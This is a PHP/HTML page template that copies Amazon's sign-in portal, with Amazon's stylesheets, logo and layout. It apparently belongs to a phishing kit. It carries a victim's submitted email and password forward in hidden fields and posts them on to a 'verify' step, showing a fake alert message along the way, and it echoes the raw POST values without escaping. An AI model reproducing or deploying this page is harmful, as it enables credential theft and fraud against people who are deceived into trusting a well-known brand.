<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-05-28">
<head>
<meta charset="utf-8">
<title dir="ltr"><?= $ealert['1']; ?></title>
<link rel="apple-touch-icon" sizes="76x76" href="img/logo.png">
<link rel="icon" type="image/png" href="img/logo.png">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61A6IErPNXL._RC|11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css?AUIClients/AmazonUI#us.not-trident">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|31jdWD+JB+L.css,41DBI6BbFkL.css_.css?AUIClients/AuthenticationPortalAssets">
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11qeL1AgUGL.css?AUIClients/CVFAssets">
<div class="a-section a-padding-medium auth-workflow">
    <div class="a-section a-spacing-none auth-navbar">
        <div class="a-section a-spacing-medium a-text-center">
            <a class="a-link-nav-icon" tabindex="-1"><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i></a>
        </div>
    </div>
    <div id="authportal-center-section" class="a-section">
        <div id="authportal-main-section" class="a-section">
            <div class="a-section auth-pagelet-container">
                <div class="a-section a-spacing-double-large">
                    <div class="a-box a-spacing-base">
                        <div class="a-box-inner a-padding-extra-large">
                          <form method="post" action="a/verify" class="a-spacing-none">
                                <input type="hidden" name="email" value="<?= $_POST['email']; ?>">
                                <input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
                                <center><img src="img/email.png" width="100"></center><br>
                                <h2 class="a-text-normal"><?= enc($ealert['1']); ?></h2>
                                <p class="a-spacing-none"><?= enc($ealert['2']); ?></p>
                                <div class="a-section a-spacing-top-extra-large">
                                    <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="continue" tabindex="3" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce"><?= enc($ealert['btn']); ?></span></span></span>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="right-2"></div>
    <div class="a-section a-spacing-top-extra-large auth-footer">
        <div class="a-divider a-divider-section">
            <div class="a-divider-inner"></div>
        </div>
        <div class="a-section a-spacing-small a-text-center a-size-mini">
            <span class="auth-footer-seperator"></span>
            <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f1']); ?></a>
            <span class="auth-footer-seperator"></span>
            <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f2']); ?></a>
            <span class="auth-footer-seperator"></span>
            <a class="a-link-normal" target="_blank" rel="noopener"><?= enc($lang['f3']); ?></a>
            <span class="auth-footer-seperator"></span>
        </div>
        <div class="a-section a-spacing-none a-text-center">
            <span class="a-size-mini a-color-secondary"><?= enc($lang['f4']); ?></span>
        </div>
    </div>
</div>
<div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts=""></div>
</div>
</body>
</html>